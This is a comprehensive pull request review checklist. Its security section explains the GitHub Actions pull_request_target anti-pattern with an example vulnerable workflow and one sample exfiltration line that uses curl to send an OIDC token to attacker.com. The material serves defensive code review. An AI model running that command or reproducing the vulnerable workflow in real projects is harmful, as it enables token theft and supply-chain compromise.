# Comprehensive PR Review Checklist

This document provides detailed criteria for reviewing pull requests. Use this as a reference when conducting thorough code reviews.

## Code Quality

### Readability
- [ ] Variable and function names are descriptive and meaningful
- [ ] Code structure is logical and easy to follow
- [ ] Nesting depth is reasonable (avoid deeply nested conditionals)
- [ ] Functions are focused and do one thing well
- [ ] Magic numbers are replaced with named constants
- [ ] Complex logic has explanatory comments

### Maintainability
- [ ] Code follows DRY principle (Don't Repeat Yourself)
- [ ] Abstractions are at appropriate levels
- [ ] Dependencies are minimal and justified
- [ ] Code is modular and loosely coupled
- [ ] Future changes would be straightforward

### Project Conventions
- [ ] Follows established coding style
- [ ] Uses project's preferred patterns and idioms
- [ ] File and directory organization matches conventions
- [ ] Naming conventions are consistent
- [ ] Import/require statements follow project standards

### Error Handling
- [ ] Errors are caught and handled appropriately
- [ ] Error messages are helpful and specific
- [ ] No silent failures or swallowed exceptions
- [ ] Edge cases have explicit handling
- [ ] Graceful degradation where appropriate

## Correctness

### Logic
- [ ] Algorithm is correct for stated purpose
- [ ] Conditions and loops are correctly structured
- [ ] Off-by-one errors are avoided
- [ ] State management is sound
- [ ] Async operations are properly handled

### Edge Cases
- [ ] Null/undefined/nil values handled
- [ ] Empty collections handled
- [ ] Boundary conditions addressed (min, max, zero)
- [ ] Concurrent access considered if applicable
- [ ] Integer overflow/underflow considered if applicable

### Alignment with Intent
- [ ] Implementation matches PR description
- [ ] All described features are present
- [ ] No undescribed significant changes
- [ ] Commit messages accurately describe changes
- [ ] Solves the stated problem

## Testing

### Test Coverage
- [ ] New functionality has tests
- [ ] Modified functionality has updated tests
- [ ] Edge cases are tested
- [ ] Error conditions are tested
- [ ] Integration points are tested

### Test Quality
- [ ] Tests are readable and maintainable
- [ ] Tests are deterministic (no flaky tests)
- [ ] Tests use appropriate assertions
- [ ] Test data is realistic
- [ ] Tests run in reasonable time
- [ ] Tests don't depend on external services unnecessarily

### Test Organization
- [ ] Tests are well-organized and grouped logically
- [ ] Test names clearly describe what they test
- [ ] Setup and teardown are appropriate
- [ ] Tests are independent of each other

## Security

### Input Validation
- [ ] All user input is validated
- [ ] Input length limits are enforced
- [ ] Type checking is performed
- [ ] Whitelisting used over blacklisting where possible

### Authentication & Authorization
- [ ] Authentication is required where needed
- [ ] Authorization checks are present
- [ ] Permissions are checked at appropriate level
- [ ] No privilege escalation vulnerabilities

### Data Safety
- [ ] No hardcoded secrets or credentials
- [ ] Sensitive data is encrypted
- [ ] SQL injection prevented (parameterized queries)
- [ ] XSS vulnerabilities prevented
- [ ] CSRF protection where needed
- [ ] No path traversal vulnerabilities

### Dependencies
- [ ] New dependencies are necessary and vetted
- [ ] Dependencies are from trusted sources
- [ ] No known vulnerable dependency versions
- [ ] Minimal dependency footprint

### CI/CD & GitHub Actions Security

**CRITICAL**: Workflows using `pull_request_target` that checkout untrusted code are a severe security risk.

#### The `pull_request_target` Anti-Pattern

The following pattern is **CRITICAL** priority and often missed in reviews:

```yaml
on:
  pull_request_target:  # ⚠️ Runs with elevated privileges

jobs:
  build:
    permissions:
      id-token: write      # ⚠️ Can obtain OIDC tokens
    steps:
      - uses: actions/checkout@v5
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # ⚠️ Checks out untrusted PR code
      - uses: third-party/action@v1   # ⚠️ Processes untrusted code with privileges
```

**Why this is dangerous:**
- `pull_request_target` runs workflow from base branch with access to secrets and OIDC tokens
- Checking out PR code brings untrusted files into the workflow environment
- Attacker controls the checked-out files and can exploit third-party actions

**Attack vectors to consider:**

1. **Code Execution**
   - [ ] Action runs npm install, pip install, or other package managers
   - [ ] Action executes scripts from the repository (setup.py, Makefile, etc.)
   - [ ] Action processes files in ways that could trigger code execution

2. **YAML/File Content Exploitation**
   - [ ] Malicious YAML could exploit unsafe deserialization
   - [ ] Injection attacks if file content passed to shell commands
   - [ ] Path traversal vulnerabilities in file processing

3. **OIDC Token Exfiltration**
   - [ ] Any code execution allows: `curl attacker.com/?token=$ACTIONS_ID_TOKEN_REQUEST_TOKEN`
   - [ ] Token accessible via environment variables and GitHub API
   - [ ] Could be used to impersonate the repository in cloud services

4. **Supply Chain Attacks**
   - [ ] Poison SDK/package builds to inject malicious code
   - [ ] Modify artifacts before publication
   - [ ] Compromise downstream users of generated packages

**What to verify when reviewing workflows:**

- [ ] **Avoid the pattern entirely**: Can this use `pull_request` instead?
- [ ] **Audit third-party actions**: Review the action's source code at the pinned commit
  - What does it do with checked-out files?
  - Does it execute any code from the repository?
  - Does it run package managers?
  - How does it parse YAML/config files?
- [ ] **Verify repository settings**: Is manual approval required for fork PRs?
  - Settings → Actions → General
  - "Require approval for all outside collaborators" should be enabled
- [ ] **Implement defense-in-depth**:
  - Use sparse checkout to limit files available
  - Add validation steps before processing untrusted files
  - Minimize permissions granted to workflows
- [ ] **Consider access model**: Who can trigger workflows? (In repos where anyone with 1+ merged PR can open new PRs, risk is higher)

**The complete trust chain:**

When a workflow uses `pull_request_target` + checkout + third-party action, you're trusting:
1. The action never executes code from the repository
2. The action safely parses all file formats (YAML, JSON, etc.)
3. The action only reads specified files (no path traversal)
4. The action doesn't leak environment variables
5. The action doesn't pass file content to shell/system calls unsafely
6. The action's dependencies are not compromised
7. The pinned commit wasn't malicious when created
8. Manual approval (if configured) actually prevents abuse

**If ANY of these fail, the repository is compromised.**

**Red flags requiring CRITICAL classification:**
- `pull_request_target` + checkout of PR code + `id-token: write` permission
- `pull_request_target` + checkout of PR code + `secrets: inherit`
- `pull_request_target` + checkout of PR code + third-party actions processing those files
- Comments claiming "this is safe" without verification/audit

**Safer alternatives:**
- Use `pull_request` trigger (no secrets/OIDC access)
- Use sparse checkout to limit exposure
- Implement separate validation job before privileged operations
- Require explicit manual approval for all fork PRs

**Remember**: A comment in the workflow saying "this is safe because the action only reads files" is NOT sufficient verification. That claim must be proven through source code audit and security review of the action.

## Performance

### Efficiency
- [ ] No unnecessary computations
- [ ] Appropriate data structures chosen
- [ ] Loops are efficient
- [ ] No N+1 query problems
- [ ] Caching used appropriately

### Scalability
- [ ] Handles expected load
- [ ] No obvious bottlenecks
- [ ] Memory usage is reasonable
- [ ] Resource cleanup is proper

### Database
- [ ] Queries are optimized
- [ ] Indexes are appropriate
- [ ] No full table scans on large tables
- [ ] Batch operations where applicable
- [ ] Connection pooling used properly

## Backward Compatibility

### API Changes
- [ ] Public API maintains backward compatibility
- [ ] Breaking changes are documented and justified
- [ ] Deprecation warnings added before removal
- [ ] Version numbers updated appropriately

### Database
- [ ] Migrations are reversible
- [ ] Migrations handle existing data safely
- [ ] No data loss in migrations
- [ ] Column renames/removals are staged appropriately

### Configuration
- [ ] Config changes are backward compatible
- [ ] Default values maintain existing behavior
- [ ] Environment variable changes documented
- [ ] Feature flags used for risky changes

### Dependencies
- [ ] Dependency updates are compatible
- [ ] Breaking changes in dependencies handled
- [ ] Lock files updated appropriately

## Documentation

### Code Documentation
- [ ] Complex logic has explanatory comments
- [ ] Comments explain "why" not "what"
- [ ] No outdated or misleading comments
- [ ] Public APIs have documentation
- [ ] Function parameters and returns documented

### Project Documentation
- [ ] README updated if user-facing changes
- [ ] API documentation updated
- [ ] Configuration changes documented
- [ ] Migration guides for breaking changes
- [ ] CHANGELOG updated if applicable

### Comments
- [ ] TODOs have context and ownership
- [ ] No commented-out code (use version control)
- [ ] Comments add value

## Architecture & Design

### Design Patterns
- [ ] Appropriate patterns used
- [ ] No anti-patterns introduced
- [ ] Consistent with existing architecture
- [ ] SOLID principles followed

### Separation of Concerns
- [ ] Business logic separated from presentation
- [ ] Data access layer properly abstracted
- [ ] Cross-cutting concerns handled appropriately

### Modularity
- [ ] Changes are properly encapsulated
- [ ] Minimal coupling between modules
- [ ] Clear interfaces and contracts

## Git Hygiene

### Commits
- [ ] Commits are logical units
- [ ] Commit messages are clear and descriptive
- [ ] No merge commits in feature branch (if applicable)
- [ ] No "WIP" or "fix typo" commits in final PR

### Scope
- [ ] PR is focused on single concern
- [ ] No unrelated changes
- [ ] PR is reviewable size (not too large)

## Language-Specific Considerations

### Python
- [ ] Type hints used appropriately
- [ ] Context managers used for resources
- [ ] List comprehensions readable
- [ ] Virtual environment properly configured

### JavaScript/TypeScript
- [ ] TypeScript types are specific (not `any`)
- [ ] Promises handled properly
- [ ] Memory leaks prevented (event listeners cleaned up)
- [ ] Bundle size impact considered

### Go
- [ ] Errors are checked
- [ ] defer used appropriately
- [ ] Goroutines properly managed
- [ ] Race conditions prevented

### Java
- [ ] Exceptions properly handled
- [ ] Resources closed properly
- [ ] Thread safety considered
- [ ] Appropriate access modifiers used

### Rust
- [ ] Ownership and borrowing correct
- [ ] Unsafe code justified and minimal
- [ ] Error handling idiomatic (Result/Option)
- [ ] Lifetime annotations appropriate

## Review Process

### Context
- [ ] Read PR description thoroughly
- [ ] Understand the problem being solved
- [ ] Check related issues/discussions
- [ ] Review previous comments on PR

### Thoroughness
- [ ] All changed files reviewed
- [ ] Related unchanged files checked for impact
- [ ] Tests examined
- [ ] CI results checked

### Communication
- [ ] Feedback is constructive
- [ ] Specific file and line references provided
- [ ] Suggestions include rationale
- [ ] Questions asked for unclear code
- [ ] Positive aspects acknowledged

## Customization

This checklist can be extended with repository-specific criteria. Add custom sections below for:
- Framework-specific patterns
- Organization coding standards
- Domain-specific requirements
- Compliance requirements
- Performance benchmarks
